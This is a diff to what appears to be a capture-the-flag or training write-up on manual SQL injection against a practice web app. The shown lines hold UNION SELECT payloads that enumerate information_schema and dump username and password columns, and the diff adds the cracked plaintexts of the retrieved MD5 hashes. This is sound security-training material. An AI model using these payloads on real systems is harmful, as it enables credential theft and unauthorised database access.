@@ -20,11 +20,11 @@ Since we are not allowed to use automated tools like sqlmap.
 ```
  5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns-- 
 ```
-4. Now we try to access users table to get users info and we get this : 2b3366bcfd44f540e630d4dc2b9b06d9
+4. Now we try to access users table to get users info and we get this : 2b3366bcfd44f540e630d4dc2b9b06d9 cracking it we get :	YesWeCan.
 ```
  5 union SELECT town, countersign FROM Member_Sql_Injection.users LIMIT 2
 ```
-5. Now we try to access users table to get db_default info and we found this : root : 3bf1114a986ba87ed28fc1b5884fc2f8
+5. Now we try to access users table to get db_default info and we found this : root : 3bf1114a986ba87ed28fc1b5884fc2f8 cracking it we get :shadow.
 ```
  5 union SELECT username,password FROM Member_Brute_Force.db_default LIMIT 2
 ```
